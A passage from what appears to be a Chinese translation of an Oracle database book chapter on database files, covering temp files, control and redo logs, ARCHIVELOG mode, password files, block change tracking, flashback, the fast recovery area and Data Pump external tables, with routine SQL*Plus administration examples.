  \ created.\nSQL> !df -h /tmp\nFilesystem            Size  Used Avail Use% Mounted\
  \ on\n/dev/mapper/VolGroup-lv_root\n50G  6.5G   41G  14% /\nSQL> !ls -l /tmp/temp_huge.dbf\n\
  -rw-r-----. 1 oracle oinstall 2147491840 Feb 15 18:06 /tmp/temp_huge.dbf\n```\n\n\
  注意\n\nUNIX/Linux 命令 `df` 显示\"磁盘可用\"空间。该命令显示，在我向数据库添加一个 2GB 临时文件之前，包含 `/tmp` 的文件系统中有\
  \ 41GB 可用空间。添加该文件后，该文件系统中*仍然*有 41GB 可用空间。\n\n显然，保存该文件并没有占用多少存储空间。如果我们查看 `ls` 的输出，它看起来是一个正常的\
  \ 2GB 文件，但实际上它目前只消耗了几千字节的存储空间。因此，即使我们只有大约 41GB 的磁盘空间可用，我们实际上可以创建数百个这样的 2GB 临时文件。听起来很棒——人人有免费存储！问题是，当我们开始使用这些临时文件并开始扩展它们时，我们会迅速遇到\"\
  没有更多空间\"的错误。由于空间是按操作系统需要分配或物理分配给文件的，我们确实有可能耗尽空间（尤其是在我们创建临时文件后，其他人用其他东西填满了文件系统）。\n\
  \n如何解决这个问题因操作系统而异。在 UNIX/Linux 上，你可以使用 `dd` 用数据填充文件，导致操作系统为文件物理分配磁盘存储，或者使用 `cp`\
  \ 创建非稀疏文件，例如：\n\n```\nSQL> !cp --sparse=never /tmp/temp_huge.dbf /tmp/temp_huge_not_sparse.dbf\n\
  SQL> !df -h /tmp\nFilesystem            Size  Used Avail Use% Mounted on\n/dev/mapper/VolGroup-lv_root\n\
  50G  8.5G   39G  19% /\nSQL> drop tablespace temp_huge including contents and datafiles;\n\
  Tablespace dropped.\nSQL> create temporary tablespace temp_huge tempfile '/tmp/temp_huge_not_sparse.dbf'\
  \ reuse;\nTablespace created.\n```\n\n将稀疏的 2GB 文件复制到 `/tmp/temp_huge_not_sparse.dbf`\
  \ 并使用 `REUSE` 选项使用该临时文件创建临时表空间后，我们可以确保该临时文件已分配其所有文件系统空间，并且我们的数据库实际上有 2GB 的临时空间可供使用。\n\
  \n注意\n\n根据我的经验，Windows NTFS 不支持稀疏文件，而 UNIX/Linux 变体则支持。另一方面，如果你必须在 UNIX/Linux 上创建一个\
  \ 15GB 的临时表空间并且支持临时文件，你会发现它发生得非常快（瞬间完成）；只需确保你有 15GB 可用空间并在心中预留出来。\n\n## 控制文件\n\n\
  控制文件是相当小的文件（通常大小为几兆字节），包含 Oracle 所需的其他文件的目录。参数文件告诉实例控制文件的位置，而控制文件则告诉实例数据库和联机重做日志文件的位置。你可以通过以下方式查看控制文件的位置：\n\
  \n```\nSQL> show parameter control_files\nNAME                                 TYPE\
  \        VALUE\n------------------------------------ ----------- ------------------------------\n\
  control_files                        string      /opt/oracle/oradata/CDB/control01.ctl,\
  \ /opt/oracle/oradata/CDB/control02.ctl\n```\n\n控制文件还告诉 Oracle 其他信息，例如有关已发生的检查点的信息、数据库的名称（应与参数文件中的\
  \ `db_name` 参数匹配）、数据库创建时的时间戳、归档重做日志历史记录（这在某些情况下会使控制文件变大）、RMAN 信息等等。\n\n控制文件应通过硬件（RAID）或在\
  \ RAID 或镜像不可用时由 Oracle 进行多路复用。应存在多个副本，并且副本应存储在不同的磁盘上，以避免在磁盘故障时丢失它们。丢失控制文件并不是致命的——只会使恢复变得更加困难。\n\
  \n控制文件是开发人员可能永远不需要实际处理的东西。对于 DBA 来说，它们是数据库的重要组成部分，但对于软件开发人员来说，它们并不真正相关。\n\n\n##\
  \ 重做日志文件\n\n重做日志文件对 Oracle 数据库至关重要。它们是数据库的事务日志。这些文件通常仅用于恢复目的，但也可用于以下用途：\n\n*   系统崩溃后的实例恢复\n\
  *   从备份中恢复数据文件后的介质恢复\n*   备用数据库处理\n*   输入到 GoldenGate——用于信息共享的重做日志挖掘过程（这是复制的一种高级说法）\n\
  *   允许管理员通过 Oracle LogMiner 实用程序检查历史数据库事务\n\n它们的主要用途是在发生实例或介质故障时使用，或作为维护用于故障切换的备用数据库的方法。如果数据库机器断电导致实例故障，Oracle\
  \ 将使用联机重做日志将系统恢复到断电前的确切状态。如果包含数据文件的磁盘驱动器永久故障，Oracle 将使用归档重做日志以及联机重做日志，将该驱动器的备份恢复到正确的时间点。此外，如果您“意外”删除了一个表或删除了一些关键信息并提交了该操作，您可以恢复备份，并使用这些联机和归档重做日志文件让\
  \ Oracle 将其恢复到事故发生前的那一刻。\n\n实际上，您在 Oracle 中执行的每个操作都会生成一定量的重做信息，写入联机重做日志文件。当您向表中插入一行时，该插入的最终结果会被写入重做日志。当您删除一行时，您删除该行的事实会被记录。当您删除一个表时，该删除操作的影响会被写入重做日志。您删除的表中的数据不会被写入；但是，Oracle\
  \ 为删除该表而执行的递归 SQL 确实会生成重做。例如，Oracle 将从 `SYS.OBJ$` 表（和其他内部字典对象）中删除一行，这将生成重做，并且如果启用了各种补充日志记录模式，实际的\
  \ `DROP TABLE` 语句将被写入重做日志流。\n\n某些操作可以在生成尽可能少的重做模式下执行。例如，我可以使用 `NOLOGGING` 属性创建索引。这意味着索引数据的初始创建不会被记录，但\
  \ Oracle 代表我执行的任何递归 SQL 将被记录。例如，代表索引存在的、插入到 `SYS.OBJ$` 中的一行将被记录，所有后续使用 SQL 插入、更新和删除对索引的修改也会被记录。但是，索引结构向磁盘的初始写入将不会被记录。\n\
  \n我提到了两种类型的重做日志文件：联机的和归档的。我们将在接下来的章节中分别查看它们。在第 9 章，我们将结合撤销段再次研究重做，看看它们对您作为开发者有什么影响。现在，我们只关注它们是什么以及它们的目的是什么。\n\
  \n### 联机重做日志\n\n每个 Oracle 数据库至少有两个联机重做日志文件组。每个重做日志组由一个或多个重做日志成员组成（重做按成员组管理）。这些组中的各个重做日志文件成员是彼此完全相同的镜像。这些联机重做日志文件大小固定，并以循环方式使用。Oracle\
  \ 将写入日志文件组 1，当写完这组文件的末尾时，它将切换到日志文件组 2，并从开始到结束覆盖这些文件的内容。当填满日志文件组 2 后，它将切换回日志文件组 1（假设我们只有两个重做日志文件组；如果有三个，当然会继续到第三组）。如图\
  \ 3-4 所示。\n\n![../images/319655_4_En_3_Chapter/319655_4_En_3_Fig4_HTML.jpg](img/319655_4_En_3_Fig4_HTML.jpg)\n\
  *图 3-4. 写入日志文件组*\n\n从一个日志文件组切换到另一个的操作称为 *日志切换*。需要注意的是，在配置不当的数据库中，日志切换可能导致临时“停顿”。由于重做日志用于在故障发生时恢复事务，我们必须确保在能够再次使用某个重做日志文件之前，不再需要其内容。如果\
  \ Oracle 不确定是否不需要某个日志文件的内容，它会暂时挂起数据库中的操作，并确保该重做“保护”的缓存中的数据已安全写入（检查点）磁盘。一旦 Oracle\
  \ 确认了这一点，处理将恢复，该重做文件将被重用。\n\n我们刚刚开始讨论一个关键的数据库概念：*检查点*。要理解联机重做日志的使用方式，您需要了解一些关于检查点、数据库缓冲区缓存如何工作以及一个称为\
  \ *数据库块写入器* (`DBWn`) 的进程所做事情的知识。数据库缓冲区缓存和 `DBWn` 将在后面更详细地介绍，但现在我们稍微提前一点，先简单提一下。\n\
  \n数据库缓冲区缓存是临时存储数据库块的地方。这是 Oracle SGA 中的一个结构。当块被读取时，它们被存储在这个缓存中，希望这样我们以后就不必再次物理读取它们。缓冲区缓存首先是一个性能调优设备。它的存在仅仅是为了使非常缓慢的物理\
  \ I/O 过程看起来快得多。当我们通过更新其上的一行来修改一个块时，这些修改是在内存中对缓冲区缓存中的块进行的。足够用于重做或重放此修改的信息存储在重做日志缓冲区中，这是另一个\
  \ SGA 数据结构。当我们 `COMMIT` 我们的修改，使其永久化时，Oracle 不会去 SGA 中找到我们修改的所有块并将它们写入磁盘。相反，它只是将重做日志缓冲区的内容写入联机重做日志。只要那个被修改的块在缓冲区缓存中而不在磁盘上，我们就需要那个联机重做日志的内容，以防数据库发生故障。如果在提交后的瞬间断电，数据库缓冲区缓存将被清除。\n\
  \n如果发生这种情况，我们更改的唯一记录就在那个重做日志文件中。在数据库重新启动时，Oracle 将实际重放我们的事务，以我们相同的方式再次修改块，并为我们提交它。因此，只要那个被修改的块被缓存而没有写入磁盘，我们就不能重用（覆盖）那个重做日志文件。\n\
  \n这就是 `DBWn` 发挥作用的地方。这个 Oracle 后台进程负责在缓冲区缓存满时腾出空间，更重要的是，执行检查点。检查点是将脏（已修改）块从缓冲区缓存写入磁盘的操作。Oracle\
  \ 在后台为我们执行此操作。许多事情都可能导致检查点发生，最常见的是重做日志切换。\n\n\n"
- '# 不完整的检查点与重做日志大小


  当我们填满日志文件 1 并切换到日志文件 2 时，Oracle 会启动一个检查点。此时，`DBWn` 进程开始将受日志文件组 1 保护的所有脏块写入磁盘。在 `DBWn`
  刷新完受该日志文件保护的所有块之前，Oracle 无法重用（覆盖）它。如果我们在 `DBWn` 完成检查点之前尝试重用它，我们的数据库 `ALERT` 日志中就会出现如下消息：


  ```

  ...

  Thread 1 cannot allocate new log, sequence 16

  Checkpoint not complete

  Current log# 3 seq# 15 mem# 0: /opt/oracle/oradata/CDB/redo03.log...

  ```


  因此，当此消息出现时，数据库中的处理会暂停，同时 `DBWn` 会急于完成其检查点。Oracle 在那一刻会将所有可能的处理能力都赋予 `DBWn`，希望它能更快完成。


  在一个调整良好的数据库实例中，你永远不想看到这条消息。如果你确实看到了，那么你很清楚，你为最终用户引入了人为的、不必要的等待。这总是可以避免的。目标（通常这是针对
  DBA，而非开发人员）是分配足够多的联机重做日志文件，以便在日志切换引发的检查点完成之前，你永远不会尝试重用日志文件。如果你经常看到此消息，则意味着 DBA 没有为应用程序分配足够的联机重做日志，或者
  `DBWn` 需要调整以更高效地工作。


  不同的应用程序会产生不同数量的重做日志。决策支持系统（DSS，仅查询）或数据仓库（DW）系统自然会比 OLTP（事务处理）系统产生的日常联机重做日志少得多。在数据库中对二进制大对象（BLOB）进行大量图像处理的系统可能比简单的订单录入系统产生多得多的重做。一个有
  100 个用户的订单录入系统产生的重做量可能只有 1000 个用户的十分之一。因此，对于你的重做日志没有“正确”的大小，尽管你确实需要确保它们对于你独特的工作负载足够大。


  在设置联机重做日志的大小和数量时，你必须考虑许多事情。其中许多超出了本书的范围，但我会列出一些让你有个概念：


  *   **高峰工作负载**：你希望系统不必等待检查点不完整消息，不会在高峰处理期间出现瓶颈。你应该根据你的高峰处理来调整重做日志的大小，而不是根据平均每小时的吞吐量。如果你每天生成
  24GB 的日志，但其中 10GB 是在上午 9 点到 11 点之间生成的，你会希望重做日志足够大，以支撑你度过那两个小时的高峰期。按平均每小时 1GB 来调整大小可能就不够了。


  *   **许多用户修改相同的块**：在这里，你可能希望有较大的重做日志文件。由于每个人都在修改相同的块，你希望在将它们写出到磁盘之前尽可能多地更新它们。每个日志切换都会触发检查点，因此你希望不频繁地切换日志。然而，这可能会影响你的恢复时间。


  *   **平均恢复时间**：如果你必须确保恢复花费尽可能少的时间，你可能会倾向于使用较小的重做日志文件，即使上一点成立。处理一两个小的重做日志文件比处理一个巨大的文件在恢复时花费的时间更少。整个系统日常运行可能比绝对最佳情况慢（由于过多的检查点），但恢复所花费的时间会更短。还有其他数据库参数也可以用来减少这个恢复时间，作为使用小重做日志文件的替代方案。


  ## 归档重做日志


  Oracle 数据库可以以两种模式之一运行：`ARCHIVELOG` 模式和 `NOARCHIVELOG` 模式。这两种模式之间的区别在于，当 Oracle 要去重用一个重做日志文件时会发生什么。“我们会保留该重做日志的副本，还是让
  Oracle 直接覆盖它，永远丢失它？”这是一个需要回答的重要问题。除非你保留这个文件，否则你无法从备份中将数据恢复到那个时间点。


  假设你每周六备份一次。现在，周五下午，在你本周生成了数百个重做日志之后，你的硬盘故障了。如果你没有运行在 `ARCHIVELOG` 模式下，你现在唯一的选择如下：


  *   删除与故障磁盘关联的表空间。任何在该磁盘上有文件的表空间都必须被删除，包括该表空间的内容。如果 `SYSTEM` 表空间（Oracle 的数据字典）或其他重要的系统相关表空间（如你的
  `UNDO` 表空间）受到影响，你就不能这样做。你将不得不使用下一个选项。


  *   恢复上周六的数据，并丢失你本周所做的所有工作。


  这两个选项都不太吸引人。两者都意味着你会丢失数据。另一方面，如果你一直在 `ARCHIVELOG` 模式下运行，你只需找到另一个磁盘，并将受影响的文件从上周六的备份中恢复到它上面。然后，你将应用归档重做日志，并最终应用联机重做日志到它们（实际上是以快进模式重放一周的事务）。你什么都不会丢失。数据被恢复到故障发生时的状态。


  人们经常告诉我，他们的生产系统不需要 `ARCHIVELOG` 模式。我还没遇到过任何人在这种说法上是正确的。我相信，除非系统处于 `ARCHIVELOG` 模式，否则它就不是一个生产系统。不在
  `ARCHIVELOG` 模式下的数据库，总有一天会丢失数据。这是不可避免的；如果你的数据库不在 `ARCHIVELOG` 模式下，*你将会丢失数据*（不是可能，而是*将会*）。


  “我们正在使用 RAID-5，所以我们完全受到保护”是一个常见的借口。我见过这样的情况：由于制造错误，RAID 组中的所有磁盘几乎在同一时间全部冻结。我还见过硬件控制器将损坏引入数据文件的情况，因此人们用
  RAID 设备安全地保护了损坏的数据。RAID 也不能保护你免受操作员错误的影响，这是数据丢失最常见的原因之一。RAID 并不意味着数据是安全的，它可能更可用，可能*更安全*，但仅仅存储在
  RAID 设备上的数据总有一天会丢失；这只是时间问题。


  “如果我们有硬件或操作员错误发生前的备份，并且归档日志没有受到影响，我们本可以恢复。”底线是，对于数据有价值的系统，没有任何借口不运行在 `ARCHIVELOG`
  模式下。性能不是借口；正确配置的归档增加很少甚至没有开销。这一点，加上一个丢失数据的快速系统是无用的这一事实，意味着即使归档增加 100%的开销，你仍然需要这样做。如果一个功能可以移除而不丢失任何重要的东西，那么它就是开销；开销就像蛋糕上的糖霜。保护你的数据并确保你不丢失数据不是开销——这是
  DBA 的主要工作！


  只有测试或*可能*开发系统应该运行在 `NOARCHIVELOG` 模式下。大多数开发系统应该运行在 `ARCHIVELOG` 模式下，原因有两个：


  *   这是你将在生产中处理数据的方式；你希望开发的行为和反应与你的生产系统一致。


  *   在许多情况下，开发人员会从数据字典中提取他们的代码，修改它，然后将其编译回数据库。开发数据库保存着当前版本的代码。如果开发数据库在下午遭受磁盘故障，你整个早上编译和重新编译的所有代码会发生什么？它丢失了。




  '
- '# 关于 `ARCHIVELOG` 模式


  不要让任何人劝你放弃 `ARCHIVELOG` 模式。你花了很长时间开发你的应用程序，因此你希望人们信任它。丢失他们的数据不会增强对你系统的信心。


  > 注意

  > 在某些情况下，一个大型数据仓库（DW）可以证明使用 `NOARCHIVELOG` 模式是合理的——前提是它明智地使用了 `READ ONLY` 表空间，并且愿意在发生故障时，通过重新加载数据来完全重建任何
  `READ WRITE` 表空间。


  '
- '# 密码文件


  密码文件是一个可选文件，它允许远程以 `SYSDBA` 或管理员身份访问数据库。当你尝试启动 Oracle 时，没有可用的数据库来验证密码。当你在本地系统（即，不是通过网络，而是在数据库实例所在的机器上）启动
  Oracle 时，Oracle 将使用操作系统（OS）进行身份验证。


  Oracle 安装时，安装者会被要求为管理员指定一个操作系统组。通常，在 UNIX/Linux 上，这个组默认是 `DBA`，在 Windows 上是 `ORA_DBA`。然而，它可以是该平台上的任何合法组名。该组是“特殊”的，因为该组中的任何用户都可以“作为
  `SYSDBA`”连接到 Oracle，而无需指定用户名或密码。


  但是，如果你尝试通过网络连接到远程数据库作为 `SYSDBA`，会发生什么：


  ```

  $ sqlplus sys/foo@localhost:1521/CDB as sysdba

  ERROR:

  ORA-01017: invalid username/password; logon denied

  ```


  对于 `SYSDBA`，操作系统身份验证在网络连接中不起作用，即使（出于安全原因）不安全的参数 `REMOTE_OS_AUTHENT` 被设置为 true。因此，操作系统身份验证无法工作，而且，如前所述，如果你试图启动一个实例来挂载并打开一个数据库，那么根据定义，此时还没有数据库可供查询身份验证细节。这是一个典型的鸡生蛋、蛋生鸡的问题。


  这时就轮到密码文件出场了。密码文件存储了允许通过网络远程以 `SYSDBA` 身份进行身份验证的用户名和密码列表。Oracle 必须使用此文件对他们进行身份验证，而不是使用存储在数据库中的常规密码列表。


  那么，让我们来纠正我们的处境。首先，确认 `REMOTE_LOGIN_PASSWORDFILE` 参数设置为其默认值 `EXCLUSIVE`，这意味着只有一个数据库使用给定的密码文件：


  ```

  SQL> show parameter remote_login_passwordfile

  NAME                                 TYPE        VALUE

  ------------------------------------ ----------- ----------

  remote_login_passwordfile            string      EXCLUSIVE

  ```


  > 注意

  > 此参数的其他有效值是 `NONE`（表示没有密码文件，没有远程 `SYSDBA` 连接）和 `SHARED`（多个数据库可以使用同一个密码文件）。


  下一步是使用命令行工具（在 UNIX/Linux 和 Windows 上）`orapwd` 来创建并填充初始密码文件：


  ```

  $ orapwd

  Usage: orapwd file= entries= force= asm=

  dbuniquename= format= sysbackup= sysdg=

  syskm= delete= input_file=

  Usage: orapwd describe file=

  where

  ...

  There must be no spaces around the equal-to (=) character.

  ```


  当我们登录到拥有 Oracle 软件的操作系统账户时，将使用的命令是：


  ```

  $ orapwd file=orapw$ORACLE_SID password=foo entries=20

  ```


  在我的例子中（我的 `ORACLE_SID` 是 `CDB`），这会创建一个名为 `orapwCDB` 的密码文件。这是大多数 UNIX/Linux 平台上此文件的命名约定（有关您平台上此文件命名的详细信息，请参阅您的安装/操作系统管理员指南），它位于
  `$ORACLE_HOME/dbs` 目录中。在 Windows 上，此文件名为 `PW%ORACLE_SID%.ora`，位于 `%ORACLE_HOME%\database`
  目录中。你应该在运行创建该文件的命令之前导航到正确的目录，或者在之后将该文件移动到正确的目录。


  现在，该文件中唯一的用户是 `SYS`，即使数据库上有其他 `SYSDBA` 账户（它们尚未在密码文件中）。然而，利用这一点，我们第一次可以作为 `SYSDBA`
  通过网络连接：


  ```

  $ sqlplus sys/foo@localhost:1521/CDB as sysdba

  SQL> show user

  USER is "SYS"

  ```


  > 注意

  > 如果在此步骤中遇到 ORA-12505 “TNS:listener does not currently know of SID given in connect
  Descriptor” 错误，这意味着数据库侦听器未为此服务器配置静态注册条目。当数据库实例未启动时，DBA 未允许远程 `SYSDBA` 连接。你需要在 `listener.ora`
  配置文件中配置静态服务器注册。请在你所使用的数据库版本的 OTN（Oracle 技术网络）文档搜索页面上搜索带引号的“Configuring Static Service
  Information”，以获取有关配置此静态服务的详细信息。如果你遇到 ORA-12528 “TNS:listener: all appropriate instances
  are blocking new connections” 错误，你也可以在 tnsnames.ora 文件中配置 `UR=A` 参数，该参数将允许你连接到被阻止的实例。


  我们已经通过身份验证，所以进去了。我们现在可以成功启动、关闭并使用 `SYSDBA` 账户远程管理此数据库。现在，我们有另一个用户 `TKYTE`，他已被授予
  `SYSDBA`，但尚无法远程连接：


  ```

  $ sqlplus tkyte/foobar@PDB1 as sysdba

  ERROR:

  ORA-01017: invalid username/password; logon denied

  ```


  原因是 `TKYTE` 还不在密码文件中。为了将 `TKYTE` 添加到密码文件中，我们需要“重新授予”该账户 `SYSDBA` 权限：


  ```

  $ sqlplus / as sysdba

  SQL> alter session set container=PDB1;

  SQL> grant sysdba to tkyte;

  Grant succeeded.

  SQL> exit

  $ sqlplus tkyte/foobar@PDB1 as sysdba

  SQL>

  ```


  这为我们创建了密码文件中的一个条目，Oracle 现在将保持密码同步。如果 `TKYTE` 更改其密码，旧的密码将停止用于远程 `SYSDBA` 连接，新的密码将开始工作。对于任何是
  `SYSDBA` 但尚未在密码文件中的用户，都重复相同的过程。




  ## 变更跟踪文件


  变更跟踪文件是一个可选文件，适用于 Oracle 10*g* 企业版及更高版本。该文件的唯一目的是跟踪自上次增量备份以来哪些数据块已被修改。借助此文件，恢复管理器（`RMAN`）工具可以仅备份实际已修改的数据库块，而无需读取整个数据库。


  在 Oracle 运行过程中，随着数据块被修改，Oracle 会可选地维护一个文件，用于告知 `RMAN` 哪些块已被更改。创建此变更跟踪文件相当简单，通过 `ALTER
  DATABASE` 命令即可完成：


  ```

  $ mkdir -p /opt/oracle/product/btc

  $ sqlplus / as sysdba

  SQL> alter database enable block change tracking using file ''/opt/oracle/product/btc/changed_blocks.btc'';

  Database altered.

  ```


  **警告**


  我将在本书中不时提醒：请谨记，设置参数、修改数据库或进行根本性更改的命令不应轻易执行，肯定应在您的“实际”系统上执行前进行测试。前面的命令实际上会导致数据库执行更多工作，它会消耗资源。


  要关闭并移除块变更跟踪文件，需要再次使用 `ALTER DATABASE` 命令：


  ```

  SQL> alter database disable block change tracking;

  Database altered.

  ```


  请注意，此命令将删除块变更跟踪文件。它不仅仅是禁用该功能——同时也删除了文件。


  **注意**


  在某些操作系统（如 Windows）上，您可能会发现，如果按照我的示例操作——创建一个块变更跟踪文件然后禁用它——该文件似乎仍然存在。这是一个特定于操作系统的问题——在许多操作系统上不会发生。只有当您从单个会话中
  `CREATE` 和 `DISABLE` 变更跟踪文件时，才会发生这种情况。创建块变更跟踪文件的会话将保持该文件打开，某些操作系统不允许删除先前进程（例如创建该文件的会话进程）已打开的文件。这是无害的；您稍后只需自己删除该文件即可。


  您可以在 `ARCHIVELOG` 或 `NOARCHIVELOG` 模式下启用这个新的块变更跟踪功能。但请记住，处于 `NOARCHIVELOG` 模式的数据库（其中每天生成的重做日志不保留）在发生介质（磁盘或设备）故障时无法恢复所有更改！`NOARCHIVELOG`
  模式的数据库将来某天会丢失数据。我们将在第 9 章更详细地介绍这两种数据库模式。


  ## 闪回日志


  闪回日志用于支持 `FLASHBACK DATABASE` 命令。闪回日志包含已修改数据库块的“前映像”，可用于将数据库恢复到之前某个时间点的状态。


  ### 闪回数据库


  引入 `FLASHBACK DATABASE` 命令是为了加速原本缓慢的数据库时间点恢复过程。它可以替代完整的数据库还原和使用归档日志进行前滚操作，主要设计用于加速从“事故”中恢复。例如，让我们看看
  DBA 可能如何从意外删除的模式中恢复——正确的模式被删除了，但只是在错误的数据库中（本意是在测试环境中删除）。DBA 立即意识到自己犯的错误，并立即关闭数据库。现在该怎么办？


  在 `FLASHBACK DATABASE` 功能出现之前，可能会发生以下情况：


  1.  DBA 会关闭数据库。

  2.  DBA 会从磁带（通常）还原数据库的最后一个完整备份，这通常是一个漫长的过程。通常，这将通过 `RMAN` 使用 `RESTORE DATABASE UNTIL
  <时间点>` 来启动。

  3.  DBA 会还原自备份以来生成的所有且在系统上不可用的归档重做日志。

  4.  使用归档重做日志（以及可能在线重做日志中的信息），DBA 将前滚数据库，并在错误的 `DROP USER` 命令执行前的时间点停止前滚。此列表中的步骤
  3 和 4 通常通过 `RMAN` 使用 `RECOVER DATABASE UNTIL <时间点>` 来启动。

  5.  数据库将以 `RESETLOGS` 选项打开。


  这是一个包含多个步骤的非平凡过程，通常会消耗大量时间（当然，这段时间无人可以访问数据库）。导致此类时间点恢复的原因有很多：升级脚本出错、升级失败、有权限的人无意中发布了命令（可能是最常见的原因），或者某个过程将数据完整性问题引入大型数据库（同样，是意外；可能它运行了两次而不是一次，或者它有
  bug）。无论原因如何，最终结果都是长时间的停机。


  假设您配置了闪回数据库功能，恢复步骤如下：


  1.  DBA 关闭数据库。

  2.  DBA 启动并加载数据库，然后发出闪回数据库命令，可以使用 `SCN`（Oracle 内部时钟）、还原点（指向 `SCN` 的指针）或时间戳（墙上时钟时间），其精度在几秒之内。

  3.  DBA 使用 `resetlogs` 打开数据库。


  闪回时，您可以闪回整个容器数据库（包括所有可插拔数据库）或仅闪回特定的可插拔数据库。当闪回可插拔数据库时，您将使用为整个数据库或特定可插拔数据库创建的还原点。闪回可插拔数据库不需要您使用
  `resetlogs` 打开数据库，但要求您连接到已闪回的可插拔数据库后发出 `RECOVER DATABASE` 命令。


  要使用闪回功能，您的数据库必须处于 `archivelog` 模式，并且必须设置快速恢复区（`FRA`）（因为闪回日志存储在 `FRA` 中）。要使用普通还原点，必须在数据库中启用闪回日志记录。保证还原点不需要数据库中的闪回日志记录。


  要查看闪回日志记录状态，请运行以下查询：


  ```

  SQL> select flashback_on from v$database;

  FLASHBACK_ON

  --------------------------------

  NO

  ```


  要在根容器中启用闪回日志记录，请执行以下操作：


  ```

  $ sqlplus / as sysdba

  SQL> alter database flashback on;

  ```


  最后一点是，您需要在真正需要使用闪回功能之前就设置好它。这不是在损坏发生后可以启用的功能；您必须做出有意识的决定来使用它，无论是持续开启还是用于设置还原点。




  '
- '# 快速恢复区 (FRA)


  Oracle 中的**快速恢复区 (FRA)** 是一个由数据库管理的位置，用于存放与数据库备份和恢复相关的多种文件。在此区域（这里的“区域”指磁盘上为此目的划出的一部分，例如一个目录），您可能会找到以下内容：


  -   RMAN 备份集（全备份和/或增量备份）

  -   RMAN 映像副本（数据文件和控制文件的字节级副本）

  -   在线重做日志

  -   归档重做日志

  -   多路复用的控制文件

  -   闪回日志


  Oracle 使用这个新区域来管理这些文件，因此服务器会知道哪些文件在磁盘上，哪些不在磁盘上（可能在其他磁带中）。利用这些信息，数据库可以执行诸如磁盘到磁盘还原受损数据文件，或将数据库“闪回”（一种“倒退”操作）以撤销本不该执行的操作。例如，您可以使用
  `FLASHBACK DATABASE` 命令将数据库恢复到五分钟前的状态（而无需对数据库进行完整还原和基于时间点的恢复）。这样您就可以“撤销删除”那个意外删除的用户账户。


  要设置快速恢复区，您需要设置两个参数：`db_recovery_file_dest_size` 和 `db_recovery_file_dest`。您可以通过以下命令查看这些参数的当前设置：


  ```sql

  SQL> show parameter db_recovery_file_dest

  NAME                                 TYPE        VALUE

  ------------------------------------ ----------- --------------------------

  db_recovery_file_dest                string      /opt/oracle/fra

  db_recovery_file_dest_size           big integer 100G

  ```


  快速恢复区更多是一个逻辑概念。它是本章讨论的文件类型的一个存放区。其使用是可选的——您不一定需要使用它，但如果您想使用某些高级功能，例如 `FLASHBACK
  DATABASE`，则必须使用此区域来存储相关信息。


  ## 数据泵文件


  **数据泵 (Data Pump)** 是 Oracle 中至少两种工具使用的文件格式。外部表可以以数据泵格式加载和卸载数据，而导入/导出工具 `IMPDP`
  和 `EXPDP` 也使用此文件格式。它们是跨平台（可移植）的二进制文件，包含元数据（不是存储在 `CREATE/ALTER` 语句中，而是以 XML 格式存储）以及可能的数据。它们使用
  XML 作为元数据表示结构，这一点作为工具的最终用户，与您我其实息息相关。`IMPDP` 和 `EXPDP` 拥有一些复杂的过滤和转换能力。这部分归因于 XML
  的使用，也因为 `CREATE TABLE` 语句并非存储为 `CREATE TABLE` 原样，而是存储为一种标记化文档。这使得轻松实现类似“请将所有对表空间
  FOO 的引用替换为表空间 BAR”这样的请求成为可能。`IMPDP` 只需应用一个简单的 XML 转换即可完成此操作。当 `FOO` 指代一个 `TABLESPACE`
  时，它会被 `<TABLESPACE>FOO</TABLESPACE>` 标签（或某些其他类似表示形式）包围。


  在第 15 章，我们将更详细地探讨这些工具。不过在此之前，让我们先看看如何利用这种数据泵格式快速从数据库 A 提取数据并移动到数据库 B。这里我们将使用一种“反向外部表”。


  外部表使我们能够读取平面文件——即普通的旧文本文件——就像它们是数据库表一样。我们可以使用 SQL 的全部功能来处理它们。它们是只读的，旨在将 Oracle 外部的数据导入。外部表也可以反向操作：可用于以数据泵格式将数据导出数据库，以方便将数据移动到其他机器或平台。要开始此练习，我们需要一个
  `DIRECTORY` 对象，告知 Oracle 卸载的目标位置：


  ```sql

  SQL> create or replace directory tmp as ''/tmp'';

  Directory created.

  SQL> create table all_objects_unload

  organization external

  ( type oracle_datapump

  default directory TMP

  location( ''allobjects.dat'' )

  )

  as

  select * from all_objects

  /

  Table created.

  ```


  实际上，操作就是这么简单：我们在 `/tmp` 下有了一个名为 `allobjects.dat` 的文件，其中包含了查询 `select * from all_objects`
  的内容。我们可以窥视一下这些信息：


  ```sql

  SQL> !strings /tmp/allobjects.dat | head

  x86_64/Linux 2.4.xx

  AL32UTF8

  19.00.00.00.00

  001:001:000001:000001

  i<?xml version="1.0" encoding="UTF-8"?

  ...

  ```


  这只是文件的头部信息。现在，使用二进制 SCP，您可以将该文件移动到任何其他已安装 Oracle 的平台上，通过发出 `CREATE DIRECTORY` 命令（告知数据库文件所在位置）和
  `CREATE TABLE` 命令，如下所示：


  ```sql

  SQL> create table t

  ( OWNER            VARCHAR2(30),

  OBJECT_NAME      VARCHAR2(30),

  SUBOBJECT_NAME   VARCHAR2(30),

  OBJECT_ID        NUMBER,

  DATA_OBJECT_ID   NUMBER,

  OBJECT_TYPE      VARCHAR2(19),

  CREATED          DATE,

  LAST_DDL_TIME    DATE,

  TIMESTAMP        VARCHAR2(19),

  STATUS           VARCHAR2(7),

  TEMPORARY        VARCHAR2(1),

  GENERATED        VARCHAR2(1),

  SECONDARY        VARCHAR2(1)

  )

  organization external

  ( type oracle_datapump

  default directory TMP

  location( ''allobjects.dat'' ));

  ```


  您就可以立即使用 SQL 读取那些卸载的数据了。这就是数据泵文件格式的威力：实现数据在系统间的即时传输，必要时甚至可以通过“人力传递网络”（sneakernet）进行。下次当您想带一部分数据回家在周末测试时，请想想这一点。


  即使数据库字符集不同（本例中相同），得益于数据泵格式，Oracle 现在有能力识别不同的字符集并处理它们。可以根据需要动态执行字符集转换，以确保数据在每个数据库的表示中都是“正确”的。


  再次说明，我们将在第 15 章回到数据泵文件格式，但本节应让您对其是什么以及文件中可能包含哪些内容有一个整体的了解。


  ## 平面文件


  平面文件自电子数据处理诞生之初就已存在。我们几乎每天都能看到它们。前面描述的文本告警日志就是一个平面文件。我在网上找到了以下对“平面文件”的定义，感觉它基本上概括了其本质：


  > *一种剥离了所有特定应用程序（程序）格式的电子记录。这允许数据元素被迁移到其他应用程序中进行操作。这种剥离电子数据的模式可以防止因硬件和专有软件过时而导致的数据丢失。*


  平面文件就是一个简单的文件，其中每一“行”是一条“记录”，并且每行都有一些文本分隔符，通常是逗号或竖线（|）。使用传统数据加载工具 `SQLLDR` 或外部表，Oracle
  可以轻松读取平面文件。实际上，我将在第 15 章详细介绍这一点。


  有时，用户会要求以某种平面文件格式提供数据，例如以下几种：


